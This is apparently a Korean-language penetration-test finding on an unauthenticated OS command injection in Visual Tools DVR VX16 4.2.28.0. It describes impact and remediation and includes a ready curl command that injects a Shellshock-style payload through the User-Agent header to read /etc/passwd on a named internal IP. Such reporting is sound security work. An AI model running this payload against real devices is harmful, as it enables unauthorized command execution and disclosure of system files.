## Visual Tools DVR VX16 4.2.28.0 - Unauthenticated OS Command Injection
- **End-Point**: `http://10.64.154.209/cgi-bin/test.cgi/cgi-bin/slogin/login.py`
- **영향**: 인증되지 않은 사용자가 원격에서 임의의 코드를 실행할 수 있으며, 이는 시스템의 기밀성, 무결성, 가용성에 심각한 영향을 미칠 수 있음.
- **설명**: Visual Tools DVR VX16 4.2.28.0 버전에서 발생하는 취약점으로, 공격자가 특수하게 조작된 HTTP 헤더를 전송하여 대상 시스템에서 OS 명령어를 실행할 수 있음.
- **근거**: `User-Agent` 헤더에 쉘 명령어를 주입하여 `/etc/passwd` 파일 내용을 출력하는 공격 방식이 확인됨.
```bash
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Host: 10.64.154.209' -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' 'http://10.64.154.209/cgi-bin/test.cgi/cgi-bin/slogin/login.py'
```
- **대응**: 해당 취약점이 해결된 최신 펌웨어 버전으로 업데이트를 수행하고, 신뢰할 수 없는 IP로부터의 관리 페이지 접근을 차단함.
- **조치**: 사용자 입력값 및 HTTP 헤더에 대한 검증 로직을 강화하여 쉘 메타문자가 포함된 요청이 처리되지 않도록 설정함.
